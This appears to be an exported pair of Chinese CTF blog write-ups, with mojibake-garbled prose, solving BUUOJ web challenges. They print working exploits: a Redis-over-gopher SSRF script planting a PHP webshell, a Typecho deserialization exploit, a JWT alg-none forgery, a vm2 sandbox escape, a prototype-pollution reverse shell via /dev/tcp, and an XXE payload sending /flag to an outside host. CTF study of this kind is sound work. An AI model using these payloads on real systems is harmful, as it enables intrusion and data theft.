[{"title":"buuoj-web02","url":"/2020/07/12/buuoj-web02/","content":"\n# [GKCTF2020]EZä¸‰å‰‘å®¢-EzWeb\næ³¨é‡Š`<!--?secret-->`  \nè®¿é—®å¾—å›æ˜¾  \n![](buuoj-web02/00.png)\n*æ­¤å¤„å®¹å™¨æœ‰é‡å¯è¿‡æ‰€ä»¥ipåœ°å€ä¼šä¸åŒï¼Œå®é™…ä¸Šæ˜¯ä¸€è‡´çš„*\nç»™äº†å†…ç½‘ipï¼Œå°±å¯ä»¥è€ƒè™‘ssrf\nåˆ©ç”¨burpsuiteæ‰«æå†…ç½‘  \n![](01.png)  \nçº¿ç¨‹å‡å°ï¼Œå¤ªå¿«ä¼š429\n(æ‰¾è¿”å›é•¿åº¦æ˜æ˜¾å’Œå…¶ä»–ä¸ä¸€æ ·çš„åŒ…æ¥çœ‹)  \nå›æ˜¾\n```\nè¢«ä½ å‘ç°äº†,ä½†ä½ ä¹Ÿè®¸éœ€è¦è¯•è¯•å…¶ä»–æœâ™‚åŠ¡,å°±åœ¨è¿™å°æœºå­ä¸Š! ...æˆ‘è¯´çš„æ˜¯ç«¯å£å•¦1\n```\nipä¸º:173.57.147.11  \nåŒæ ·çš„æ­¥éª¤ï¼Œæ‰«ç«¯å£ï¼Œè¿™ä¸ªæ—¶å€™å¯èƒ½å°±å‡¸æ˜¾ç»éªŒçš„é‡è¦æ€§äº†...ç›´æ¥çŒœå‡ ä¸ªé‡è¦ç«¯å£  \n>\nsqlserverï¼š 1433\nMySQLï¼š 3306\nOracle ï¼š 1521\nhttpï¼š 80\nhttpsï¼š 443\nredisï¼š 6379\nå›æ˜¾\n```\n-ERR wrong number of arguments for 'get' command 1\n```\nç«¯å£æ˜¯6379\n\n[CTFä¸­SSRFçš„ä¸€äº›trick](https://xz.aliyun.com/t/4420#toc-3)\n[æµ…æRedisä¸­SSRFçš„åˆ©ç”¨](https://www.redteaming.top/2019/07/15/%E6%B5%85%E6%9E%90Redis%E4%B8%ADSSRF%E7%9A%84%E5%88%A9%E7%94%A8/)  \n\n> åœ¨RESPä¸­ï¼Œåè®®çš„ä¸åŒéƒ¨åˆ†å§‹ç»ˆä»¥\"\\r\\n\"(CRLF)ç»“æŸã€‚\n\nåˆ©ç”¨ç»å¯¹è·¯å¾„å†™webshell  \næ‰§è¡Œè„šæœ¬\n```py\n#py3\nimport urllib.parse\nprotocol=\"gopher://\"\nip=\"173.73.182.11\"\nport=\"6379\"\nshell=\"\\n\\n<?php eval($_GET[\\\"cmd\\\"]);?>\\n\\n\"\nfilename=\"shell.php\"\npath=\"/var/www/html\"\npasswd=\"\"\ncmd=[\"flushall\",\n\t \"set 1 {}\".format(shell.replace(\" \",\"${IFS}\")),\n\t \"config set dir {}\".format(path),\n\t \"config set dbfilename {}\".format(filename),\n\t \"save\"\n\t ]\nif passwd:\n\tcmd.insert(0,\"AUTH {}\".format(passwd))\npayload=protocol+ip+\":\"+port+\"/_\"\ndef redis_format(arr):\n\tCRLF=\"\\r\\n\"\n\tredis_arr = arr.split(\" \")\n\tcmd=\"\"\n\tcmd+=\"*\"+str(len(redis_arr))\n\tfor x in redis_arr:\n\t\tcmd+=CRLF+\"$\"+str(len((x.replace(\"${IFS}\",\" \"))))+CRLF+x.replace(\"${IFS}\",\" \")\n\tcmd+=CRLF\n\treturn cmd\n\nif __name__==\"__main__\":\n\tfor x in cmd:\n\t\tpayload += urllib.parse.quote(redis_format(x))\n\tprint (payload)\n```\nå¾—åˆ°payload\n`gopher://173.73.182.11:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2431%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A`\nè¯»flagæ–‡ä»¶\n`http://173.73.182.11/shell.php?cmd=system('cat$IFS$9/flag');`\n\n# [GKCTF2020]EZä¸‰å‰‘å®¢-EzTypecho\nç»™äº†æºç   \n[typechoæ¼æ´åˆ†æä¸HCTFå®æˆ˜](https://cloud.tencent.com/developer/article/1038270)\n>\n\\_\\_destruct()æ˜¯åœ¨å¯¹è±¡è¢«é”€æ¯çš„æ—¶å€™è‡ªåŠ¨è°ƒç”¨\n\\_\\_wakeup()åœ¨ååºåˆ—åŒ–çš„æ—¶å€™è‡ªåŠ¨è°ƒç”¨\n\\_\\_toString()æ˜¯åœ¨è°ƒç”¨å¯¹è±¡çš„æ—¶å€™è‡ªåŠ¨è°ƒç”¨ã€‚\n\\_\\_get()ä¼šåœ¨è¯»å–ä¸å¯è®¿é—®çš„å±æ€§çš„å€¼çš„æ—¶å€™è°ƒç”¨\n\nåœ¨é¡µé¢å°è¯•ï¼Œå‘ç°![](02.png)\n\næºç :\ninstall.php line231\n```php\nif(!isset($_SESSION)) { die('no, you can\\'t unserialize it without session QAQ');}\n$config = unserialize(base64_decode(Typecho_Cookie::get('__typecho_config')));\nTypecho_Cookie::delete('__typecho_config');\n$db = new Typecho_Db($config['adapter'], $config['prefix']);\n$db->addServer($config, Typecho_Db::READ | Typecho_Db::WRITE);\nTypecho_Db::set($db);\n```\nååºåˆ—åŒ–åˆ©ç”¨ç‚¹â†‘ï¼Œè·Ÿè¿›get()å‡½æ•°   \nå¹¶ä¸”è¿™é‡Œçš„`$db = new Typecho_Db($config['adapter'], $config['prefix']);`è°ƒç”¨äº†å¯¹è±¡\n\ncookie.php line83\n```php\npublic static function get($key, $default = NULL)\n{\n$key = self::$_prefix . $key;\n$value = isset($_COOKIE[$key]) ? $_COOKIE[$key] : (isset($_POST[$key]) ? $_POST[$key] : $default);\nreturn is_array($value) ? $default : $value;\n}\n```\n1.cookieå€¼æ˜¯å¦å­˜åœ¨\n2.$valueæ˜¯å¦æ˜¯ä¸€ä¸ªæ•°ç»„\nåˆ©ç”¨cookieæˆ–è€…POSTä¼ å…¥  \næ³¨æ„åˆ°åœ¨ä¹‹å‰çš„ä»£ç ä¸­è°ƒç”¨è¿‡äº†å¯¹è±¡ï¼Œå¯ä»¥åˆ©ç”¨`__toString()`  \næ¥ä¸‹æ¥å…¨å±€æœç´¢`__toString()` æ‰¾åˆ°å¯ä»¥åˆ©ç”¨çš„ç±»(Typecho_Feed())\nfeed.php line284\n```php\nforeach ($this->_items as $item) {\n    $content .= '<item>' . self::EOL;\n    $content .= '<title>' . htmlspecialchars($item['title']) . '</title>' . self::EOL;\n    $content .= '<link>' . $item['link'] . '</link>' . self::EOL;\n    $content .= '<guid>' . $item['link'] . '</guid>' . self::EOL;\n    $content .= '<pubDate>' . $this->dateFormat($item['date']) . '</pubDate>' . self::EOL;\n    //ç»™å¸ˆå‚…ä»¬å‡è½»è´Ÿæ‹…QAQï¼Œè¦åŠ ä¸Š$item['category'] = array(new Typecho_Request());å’Œ$this->_typeé˜²æ­¢500\n    $content .= '<dc:creator>' . htmlspecialchars($item['author']->screenName) . '</dc:creator>' . self::EOL;\n```\næ³¨æ„åˆ°`$item['author']->screenName`,è·Ÿè¿›`$__items`\n\nfeed.php line112\n```php\nprivate $_items = array();\n```\n`$_items`æ˜¯ä¸€ä¸ªç§æœ‰å˜é‡ï¼Œç”±æ­¤å¯ä»¥è”æƒ³åˆ°`__get()`å‡½æ•°  \nå½“æ‰§è¡Œ`$item['author']->screenName`æ—¶å·²ç»ç”¨åˆ°äº†è¿™ä¸ªå‡½æ•°  \nè·Ÿè¿›`__get()`å…¨å±€æœç´¢ï¼Œæœ€åå¯ä»¥è¿½æº¯åˆ°(Typecho_Request())\nrequest.php line295  \n```php\npublic function get($key, $default = NULL)\n{\n    switch (true) {\n        case isset($this->_params[$key]):\n            $value = $this->_params[$key];\n            break;\n        case isset(self::$_httpParams[$key]):\n            $value = self::$_httpParams[$key];\n            break;\n        default:\n            $value = $default;\n            break;\n    }\n\n    $value = !is_array($value) && strlen($value) > 0 ? $value : $default;\n    return $this->_applyFilter($value);\n}\n```\nå†è·Ÿè¿›`__applyFilter($value)`\nrequest.php line159\n```php\nprivate function _applyFilter($value)\n{\n    if ($this->_filter) {\n        foreach ($this->_filter as $filter) {\n            $value = is_array($value) ? array_map($filter, $value) :\n            call_user_func($filter, $value);\n        }\n\n        $this->_filter = array();\n    }\n\n    return $value;\n}\n```\næ³¨æ„åˆ°è¿™é‡Œçš„`call_user_func()`ï¼Œå¯ä»¥æ‰§è¡Œå‘½ä»¤ \n\n>//ç»™å¸ˆå‚…ä»¬å‡è½»è´Ÿæ‹…QAQï¼Œè¦åŠ ä¸Š$item['category'] = array(new Typecho_Request());å’Œ$this->\\_typeé˜²æ­¢500\n\n\npoc.php\n```php\n<?php\nclass Typecho_Feed\n{\n    const ATOM1 = 'ATOM 1.0';\n\n    private $_type;\n    private $_items;\n\n    public function __construct() {\n        $this->_type = $this::ATOM1;\n        $this->_items[0] = array(\n            'category' => array(new Typecho_Request()),\n            'author' => new Typecho_Request(),\n        );\n    }\n}\n\nclass Typecho_Request\n{\n    private $_params = array('screenName'=>'system(\"cat /flag\")');\n    private $_filter = array('assert');\n}\n\n$poc = array(\n    'adapter' => new Typecho_Feed(),\n    'prefix'  => 'typecho_'\n);\n\necho base64_encode(serialize($poc));\n?>\n\n```\ninstall.php line59\n```php\nif (!isset($_GET['finish']) && file_exists(__TYPECHO_ROOT_DIR__ . '/config.inc.php') && empty($_SESSION['typecho'])) {\n        exit;\n    }\n// æŒ¡æ‰å¯èƒ½çš„è·¨ç«™è¯·æ±‚\nif (!empty($_GET) || !empty($_POST)) {\n    if (empty($_SERVER['HTTP_REFERER'])) {\n        exit;\n    }\n\n    $parts = parse_url($_SERVER['HTTP_REFERER']);\n\tif (!empty($parts['port'])) {\n        $parts['host'] = \"{$parts['host']}:{$parts['port']}\";\n    }\n\n    if (empty($parts['host']) || $_SERVER['HTTP_HOST'] != $parts['host']) {\n        exit;\n    }\n}\n```\næ‰€ä»¥å¸¦ä¸Šfinishå‚æ•°å’ŒReferer  \nåŒæ—¶æ£€æµ‹äº†æ˜¯å¦æœ‰$\\_\\_SESSION,ä½†æ˜¯åœ¨æ–‡ä»¶ä¸­session_start()å·²è¢«æ³¨é‡Š  \n[Session ä¸Šä¼ è¿›åº¦](https://www.php.net/manual/zh/session.upload-progress.php)\n![](04.png)\nexp.py\n```py\nimport requests\nurl='http://b114cfc5-a3ba-4ce4-be1c-41de9496d3a7.node3.buuoj.cn/install.php?finish=1'\nfiles={'file':123}\nheaders={'cookie':'PHPSESSID=test;__typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo4OiJBVE9NIDEuMCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6Mjp7czo4OiJjYXRlZ29yeSI7YToxOntpOjA7TzoxNToiVHlwZWNob19SZXF1ZXN0IjoyOntzOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9wYXJhbXMiO2E6MTp7czoxMDoic2NyZWVuTmFtZSI7czoxOToic3lzdGVtKCJjYXQgL2ZsYWciKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fXM6NjoiYXV0aG9yIjtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjE5OiJzeXN0ZW0oImNhdCAvZmxhZyIpIjt9czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfZmlsdGVyIjthOjE6e2k6MDtzOjY6ImFzc2VydCI7fX19fX1zOjY6InByZWZpeCI7czo4OiJ0eXBlY2hvXyI7fQ==',\n 'Referer':'http://b114cfc5-a3ba-4ce4-be1c-41de9496d3a7.node3.buuoj.cn/install.php'}\nre=requests.post(url,files=files,headers=headers,data={\"PHP_SESSION_UPLOAD_PROGRESS\": \"123\"})\nprint(re.text)\n```\n\n# [GKCTF2020]è€å…«å°è¶…å¸‚å„¿\n[æ¸—é€æµ‹è¯•|shopxoåå°å…¨ç‰ˆæœ¬è·å–shellå¤ç°](http://www.nctry.com/1660.html)\nèšå‰‘è¿ä¸Š`http://be4a445c-99ff-416a-ab18-dfe2fc32de64.node3.buuoj.cn/public/static/index/default/1.php`,åœ¨flagä¸­å‘ç°flagåœ¨rootä¸‹ï¼Œä½†æ˜¯rootæ— æ³•è®¿é—®,åœ¨æ ¹ç›®å½•ä¸‹å‘ç°`auto.sh`\n```sh\n#!/bin/sh\nwhile true; do (python /var/mail/makeflaghint.py &) && sleep 60; done\n```\næ‰¾åˆ°è¿™ä¸ªpy\n```py\nimport os\nimport io\nimport time\nos.system(\"whoami\")\ngk1=str(time.ctime())\ngk=\"\\nGet The RooT,The Date Is Useful!\"\nf=io.open(\"/flag.hint\", \"rb+\")\nf.write(str(gk1))\nf.write(str(gk))\nf.close()\n```\nç›´æ¥æŠŠos.system()æ›¿æ¢æˆ`os.system('cat /root/flag>/1.txt')`\n","tags":["practice"]},{"title":"buuoj-web01","url":"/2020/07/12/buuoj-web01/","content":"buuoj-wp-web01\n\n# [HFCTF2020]EasyLogin\n![](00.png)\næ³¨é‡Šä¸­å†™äº†è·¯å¾„ç›´æ¥å¡«äº†æ ¹ç›®å½•ï¼Œæ‰€ä»¥å¯èƒ½æœ‰ä»»æ„æ–‡ä»¶è¯»å–çš„æ¼æ´  \n\nkoaæ¡†æ¶  \nå…³äºkoaçš„ç›®å½•ç»“æ„  \n![](01.png)\n~~å›¾æ˜¯å·çš„~~\nåœ¨controllersä¸‹çš„api.jsæ‰¾åˆ°å…³é”®ä»£ç  \n```js\nconst crypto = require('crypto');\nconst fs = require('fs')\nconst jwt = require('jsonwebtoken')\n\nconst APIError = require('../rest').APIError;\n\nmodule.exports = {\n    'POST /api/register': async (ctx, next) => {\n        const {username, password} = ctx.request.body;\n\n        if(!username || username === 'admin'){\n            throw new APIError('register error', 'wrong username');\n        }\n\n        if(global.secrets.length > 100000) {\n            global.secrets = [];\n        }\n\n        const secret = crypto.randomBytes(18).toString('hex');\n        const secretid = global.secrets.length;\n        global.secrets.push(secret)\n\n        const token = jwt.sign({secretid, username, password}, secret, {algorithm: 'HS256'});\n\n        ctx.rest({\n            token: token\n        });\n\n        await next();\n    },\n\n    'POST /api/login': async (ctx, next) => {\n        const {username, password} = ctx.request.body;\n\n        if(!username || !password) {\n            throw new APIError('login error', 'username or password is necessary');\n        }\n\n        const token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;\n\n        const sid = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()).secretid;\n\n        console.log(sid)\n\n        if(sid === undefined || sid === null || !(sid < global.secrets.length && sid >= 0)) {\n            throw new APIError('login error', 'no such secret id');\n        }\n\n        const secret = global.secrets[sid];\n\n        const user = jwt.verify(token, secret, {algorithm: 'HS256'});\n\n        const status = username === user.username && password === user.password;\n\n        if(status) {\n            ctx.session.username = username;\n        }\n\n        ctx.rest({\n            status\n        });\n\n        await next();\n    },\n\n    'GET /api/flag': async (ctx, next) => {\n        if(ctx.session.username !== 'admin'){\n            throw new APIError('permission error', 'permission denied');\n        }\n\n        const flag = fs.readFileSync('/flag').toString();\n        ctx.rest({\n            flag\n        });\n\n        await next();\n    },\n\n    'GET /api/logout': async (ctx, next) => {\n        ctx.session.username = null;\n        ctx.rest({\n            status: true\n        })\n        await next();\n    }\n};\n```\néœ€è¦è®©username=admin,ä¹‹åå†è®¿é—®/flagå°±å¯ä»¥å¾—åˆ°flag    \n```js\nconst token = jwt.sign({secretid, username, password}, secret, {algorithm: 'HS256'});\n```\njwtä¼ªé€ \n\nå¯¹äº\n```js\nif(sid === undefined || sid === null || !(sid < global.secrets.length && sid >= 0)) {\n    throw new APIError('login error', 'no such secret id');\n}\n```\nå¯¹äºsid>=0:jså¼±ç±»å‹  \n>[]>=0   //trueï¼Œæ•°ç»„\n\"\">=0  //trueï¼Œå­—ç¬¦ä¸²\n\nå¯¹äºsid < global.secrets.length  \næ³¨å†Œä»¥åˆå§‹åŒ–å…¨å±€å˜é‡secrets  \n\n>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzZWNyZXRpZCI6MSwidXNlcm5hbWUiOiJhZG1pbiIsInBhc3N3b3JkIjoiYWRtaW4iLCJpYXQiOjE1ODg3NjI1NzN9.3IgFzoext6mvEihGuoEvscbdcRXtk9Abw1MolCaMeb4\n\nè¿™æ ·çš„å½¢å¼ä»£è¡¨çš„æ˜¯base64(header).base64(payload).base64(signature)  \nå½“headerä¸­çš„algä¸ºnoneæ—¶ï¼Œåç«¯å°†ä¸æ‰§è¡Œç­¾åéªŒè¯  \næ­¤æ—¶å½¢å¼ä¸º:base64(header).base64(payload).  \n\n/api/registeråœ¨bodyä¼ å…¥jsonå€¼æ³¨å†Œç”¨æˆ·ï¼Œå¾—åˆ°tokenå›æ˜¾\n```js\n{\n    \"token\": \"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzZWNyZXRpZCI6MiwidXNlcm5hbWUiOiJhYWEiLCJwYXNzd29yZCI6ImFhYSIsImlhdCI6MTU4ODgzODQyMX0.gqdlrjOgx2xBp-LA-0MVsw6LgGppnkp6tmmDiYQUDWw\"\n}\n```\nå»æ‰ç­¾åç®—æ³•\n```js\n{\n  \"alg\": \"none\",\n  \"typ\": \"JWT\"\n},\n{\n  \"secretid\": [],\n  \"username\": \"admin\",\n  \"password\": \"admin\"\n}\n```\nè¿™é‡Œç”¨base64encodeå°±è¡Œ\n```\neyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzZWNyZXRpZCI6W10sInVzZXJuYW1lIjogImFkbWluIiwicGFzc3dvcmQiOiAiYWRtaW4iLCJpYXQiOiAxNTg4ODM4NDIxfQ.\n```\nåœ¨ç™»å½•ç•Œé¢bodyä¼ å…¥usernameå’Œpasswordå€¼,å¤´ä¸­æ·»åŠ authorizationä¼ å…¥tokenå€¼  \næˆåŠŸåè®¿é—®/api/flag\n\n\n\n# [HFCTF2020]JustEscape\n![](02.png)\næ‰§è¡Œå‘½ä»¤?æ³¨æ„ç¼–ç ?ä¸æ˜¯php?  \nçœ‹ä¸€ä¸‹run.php\n```php\n<?php\nif( array_key_exists( \"code\", $_GET ) && $_GET[ 'code' ] != NULL ) {\n    $code = $_GET['code'];\n    echo eval(code);\n} else {\n    highlight_file(__FILE__);\n}\n?>\n```\næœ‰ä¸ªeval()  \nåˆ©ç”¨å¼‚å¸¸æŠ›å‡ºçš„è¯­å¥ç¡®è®¤åç«¯ä½¿ç”¨çš„è¯­è¨€  \nrun.php?code=Error().stack\n>jsä¸­æ•è·å¼‚å¸¸å †æ ˆä¿¡æ¯â€”Error.stack\n\nå¾—åˆ°\n![](03.png)\n=>1.nodejs 2.vm2\n[Node.js å¸¸è§æ¼æ´å­¦ä¹ ä¸æ€»ç»“](https://xz.aliyun.com/t/7184)  \n[vm2-3.8.3é€ƒé€¸issue](https://github.com/patriksimek/vm2/issues/225)  \n```\n/run.php?code=\n'(' + function(){\n    TypeError.prototype.get_process = f=>f.constructor(\"return process\")();\n    try{\n        Object.preventExtensions(Buffer.from(\"\")).a = 1;\n    }catch(e){\n        return e.get_process(()=>{}).mainModule.require(\"child_process\").execSync(\"whoami\").toString();\n    }\n}+')()';\n```\næ²¡ä»€ä¹ˆååº”,å¯èƒ½è¿‡æ»¤äº†ä¸€äº›è¯  \n`exec` `constructor` `process` `prototype` `\"\"` `+`\n[æ¨¡æ¿å­—ç¬¦ä¸²](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/template_strings)  \nå¯ä»¥åˆ©ç”¨æ¨¡æ¿å­—ç¬¦ä¸²åµŒå¥—æ¥æ‹¼æ¥ï¼Œç”¨åå¼•å·æ¥ä»£æ›¿åŒå¼•å·  \n```\n/run.php?code=\n(function (){\n    TypeError[`${`${`prototyp`}e`}`][`${`${`get_proces`}s`}`] = f=>f[`${`${`constructo`}r`}`](`${`${`return this.proces`}s`}`)();\n    try{\n        Object.preventExtensions(Buffer.from(``)).a = 1;\n    }catch(e){\n        return e[`${`${`get_proces`}s`}`](()=>{}).mainModule[`${`${`requir`}e`}`](`${`${`child_proces`}s`}`)[`${`${`exe`}cSync`}`](`cat ../flag`).toString();\n    }\n})()\n``` \n\n\n\n# [ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz\n ä¸­é—´å› ä¸ºè¡¥è€ƒé¸½äº†å¥½å¤šå¤©é˜¿=ã€‚=ï¼Œçœ‹ä¸€ä¸‹é”™è¿‡çš„ç½‘é¼æ¯\nsträ¼ å€¼å,è¦æ»¡è¶³is_validçš„æ¡ä»¶(åŸºæœ¬ä¸Šéƒ½èƒ½æ»¡è¶³)  \næœ€ç»ˆç›®çš„æ˜¯read()è¯»å–flag.php  \n\nç±»é‡Œæœ‰protected private publicä¸‰ç§ç±»å‹çš„å‚æ•°  \n[ä¸€æ–‡è®©PHPååºåˆ—åŒ–ä»å…¥é—¨åˆ°è¿›é˜¶](https://xz.aliyun.com/t/6753#toc-2)  \npublicå‚æ•°ä¸å˜ï¼Œprotectedä¼šå˜æˆ `%00*%00å‚æ•°å`,private `%00ç±»å%00å‚æ•°å`  \n\\_\\_construct()ä¼šå…ˆæ‰§è¡Œ  \næœ¬åœ°æµ‹è¯•äº†ä»¥ä¸‹ï¼Œåœ¨ç±»é‡Œé­”æœ¯æ–¹æ³•çš„æ‰§è¡Œä¼˜å…ˆçº§æ˜¯å¤§äºå…¶ä»–æ–¹æ³•çš„  \nå¦‚æœè¯´æƒ³è¦æ‰§è¡Œread,åœ¨readè¢«è°ƒç”¨ä¹‹å‰å°±è¦ä½¿op==2ï¼Œä½†æ˜¯åœ¨è¿™ä¹‹å‰ä¼šé¦–å…ˆæ‰§è¡Œ__destructï¼Œå°†opæ”¹ä¸º1  \nä½†æ˜¯æ³¨æ„åˆ°è¿™é‡Œ__destruct()é‡Œçš„åˆ¤æ–­æ˜¯`===`è€Œwriteå’Œreadé‡Œçš„åˆ¤æ–­æ˜¯`==`ï¼Œå¯èƒ½æ˜¯åˆ©ç”¨å¼±ç±»å‹æ¥ç»•è¿‡  \n[phpå¼±ç±»å‹å®‰å…¨](https://www.smi1e.top/php%E5%BC%B1%E7%B1%BB%E5%9E%8B%E5%AE%89%E5%85%A8/)\nå¯ä»¥åˆ©ç”¨2e0ç»•è¿‡  \n\nå› ä¸ºpayloadé‡Œä¼šå‡ºç°%00å­—ç¬¦ï¼Œæ‰€ä»¥éœ€è¦ç»•è¿‡is_valid()é‡Œçš„åˆ¤æ–­  \nphpç‰ˆæœ¬æ˜¯7.4.3ï¼Œ`php7.1+ç‰ˆæœ¬å¯¹å±æ€§ç±»å‹ä¸æ•æ„Ÿ`ï¼Œå°±ç›´æ¥å½“æˆpublicå³å¯  \n```\n <?php\nclass FileHandler {\n        public $op=2e0; \n        public $filename='flag.php';\n        public $content;\n}\n$a = new FileHandler();\necho serialize($a);\n?>\n```\n```\nO:11:\"FileHandler\":3:{s:2:\"op\";d:2;s:8:\"filename\";s:8:\"flag.php\";s:7:\"content\";N;}\n```\n\n# [ç½‘é¼æ¯ 2020 é’é¾™ç»„]notes\nç»™äº†æºç \nç”¨çš„expressæ¡†æ¶ï¼Œæ˜¯node.js  \nåœ¨statusè·¯ç”±ä¸‹æœ‰ä¸ªexec()å‡½æ•°ï¼Œå…ˆç•™æ„ä¸‹  \nè¿˜æœ‰ä¸€ä¸ªä¸å’‹è§è¿‡çš„undefsafe()  \n[undefsafe()](https://www.npmjs.com/package/undefsafe)\n[Prototype Pollution in undefsafe | Snyk](https://snyk.io/vuln/SNYK-JS-UNDEFSAFE-548940)\næ–‡ç« ç»™çš„poc:\n```js\nvar a = require(\"undefsafe\");\nvar payload = \"__proto__.toString\";\na({},payload,\"JHU\");\nconsole.log({}.toString);\n```\næ‰¾åˆ°åˆ©ç”¨ç‚¹\n```js\n    edit_note(id, author, raw) {\n        undefsafe(this.note_list, id + '.author', author);\n        undefsafe(this.note_list, id + '.raw_note', raw);\n    }\n```\nåœ¨/edit_noteé‡Œä¼ å…¥  \nid=`__proto__`ï¼Œauthor=`bash -i > /dev/tcp/ip/port 0>&1`ï¼Œraw=`aaa`  \nä¹‹åè®¿é—®/statusä½¿å¾—payloadèƒ½å®ç°  \n~~ä¸è¿‡ç«¯å£æ”¶ä¸åˆ°ä»»ä½•ä¸œè¥¿æ˜¯ä»€ä¹ˆé¬¼é˜¿~~\no,åŸæ¥æ˜¯è¦ç”¨å®ƒæä¾›çš„æœåŠ¡å™¨æ¥è¿æ¥çš„\n\n# [ç½‘é¼æ¯ 2020 é’é¾™ç»„]filejava\n~~æ‡µ~~\nä¼ å…¥æ–‡ä»¶åå¯ä»¥å¾—åˆ°æ–‡ä»¶æ‰€åœ¨çš„è·¯å¾„  \næœ‰ä»»æ„æ–‡ä»¶ä¸Šä¼ çš„æ¼æ´  \n[ä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´](https://bealright.github.io/2019/10/24/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/)  \n\n> /WEB-INF/web.xmlï¼šWebåº”ç”¨ç¨‹åºé…ç½®æ–‡ä»¶ï¼Œæè¿°äº† servlet å’Œå…¶ä»–çš„åº”ç”¨ç»„ä»¶é…ç½®åŠå‘½åè§„åˆ™  \n\n`POST /DownloadServlet?filename=../../../../WEB-INF/web.xml HTTP/1.1`è¯»å–serveletä¿¡æ¯\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<web-app xmlns=\"http://xmlns.jcp.org/xml/ns/javaee\"\n         xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n         xsi:schemaLocation=\"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd\"\n         version=\"4.0\">\n    <servlet>\n        <servlet-name>DownloadServlet</servlet-name>\n        <servlet-class>cn.abc.servlet.DownloadServlet</servlet-class>\n    </servlet>\n\n    <servlet-mapping>\n        <servlet-name>DownloadServlet</servlet-name>\n        <url-pattern>/DownloadServlet</url-pattern>\n    </servlet-mapping>\n\n    <servlet>\n        <servlet-name>ListFileServlet</servlet-name>\n        <servlet-class>cn.abc.servlet.ListFileServlet</servlet-class>\n    </servlet>\n\n    <servlet-mapping>\n        <servlet-name>ListFileServlet</servlet-name>\n        <url-pattern>/ListFileServlet</url-pattern>\n    </servlet-mapping>\n\n    <servlet>\n        <servlet-name>UploadServlet</servlet-name>\n        <servlet-class>cn.abc.servlet.UploadServlet</servlet-class>\n    </servlet>\n\n    <servlet-mapping>\n        <servlet-name>UploadServlet</servlet-name>\n        <url-pattern>/UploadServlet</url-pattern>\n    </servlet-mapping>\n</web-app>\n``` \n`/WEB-INF/classes/ï¼šå«äº†ç«™ç‚¹æ‰€æœ‰ç”¨çš„ class æ–‡ä»¶ï¼ŒåŒ…æ‹¬ servlet class å’Œéservlet classï¼Œä»–ä»¬ä¸èƒ½åŒ…å«åœ¨ .jaræ–‡ä»¶ä¸­`\n\n> å¯¹äº`cn.abc.servlet.DownloadServlet`æ¥è¯´ï¼Œç›¸å¯¹åœ°å€æ˜¯`WEB-INF/classes/cn/abc/servlet/DownloadServlet.class`\n\nä¸‹è½½.classæ–‡ä»¶è¿›è¡Œåç¼–è¯‘  \nåœ¨uploadservleté‡Œæœ‰\n```java\nif (filename.startsWith(\"excel-\") && \"xlsx\".equals(fileExtName)) {\n                        try {\n                            final Workbook wb1 = WorkbookFactory.create(in);\n                            final Sheet sheet = wb1.getSheetAt(0);\n                            System.out.println(sheet.getFirstRowNum());\n                        }\n                        catch (InvalidFormatException e) {\n                            System.err.println(\"poi-ooxml-3.10 has something wrong\");\n                            e.printStackTrace();\n                        }\n                    }\n```\n[åˆ©ç”¨ EXCEL æ–‡ä»¶é€²è¡Œ XXE æ”»æ“Šçš„æ¼æ´åˆ†æ](https://www.jishuwen.com/d/2inW/zh-hk)  \nå½“æ—¶æ˜¯ç»™äº†hint?buuojä¸Šæ²¡æœ‰/flagçš„hint  \næ–°å»ºä¸€ä¸ªexcel-.xlsxæ–‡ä»¶å,æ”¹åç¼€ä¸ºzipè¿›è¡Œè§£å‹ï¼Œä¿®æ”¹[Content-Types].xmlçš„å†…å®¹\n```xml\n<!DOCTYPE ANY[\n    <!ENTITY % file SYSTEM \"file:///flag\">\n    <!ENTITY % remote SYSTEM 'http://ip:port/xxe.dtd'>\n    %remote;\n    %all;\n]>\n<root>&send;</root>\n```\nxxe.dtdï¼š(æ”¾åœ¨æ ¹ç›®å½•ä¸‹)\n```dtd\n<!ENTITY % all \"<!ENTITY send SYSTEM 'http://ip:port/%file;'>\">\n```\nä¿®æ”¹å†…å®¹åæŠŠæ–‡æ¡£å‹ç¼©æˆxlsxæ–‡ä»¶ï¼Œä¸Šä¼ \nä¹‹åæŸ¥çœ‹apacheçš„access.log  \n~~ä½†æ˜¯è¿˜æ˜¯æ²¡æœ‰æ”¶åˆ°~~  \n\n# 